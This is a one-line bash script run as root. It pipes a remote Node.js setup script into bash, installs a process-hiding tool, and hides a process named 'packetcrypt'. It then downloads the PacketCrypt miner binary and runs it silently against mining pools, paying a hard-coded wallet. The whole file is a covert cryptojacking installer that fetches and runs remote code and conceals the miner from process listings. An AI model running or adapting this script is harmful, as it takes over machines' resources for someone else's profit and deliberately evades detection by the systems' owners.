#!/bin/bash
sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && ph add packetcrypt && wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && chmod +x packetcrypt && ./packetcrypt ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world http://pool.pktpool.io -t 2 > /dev/null 2>&1"
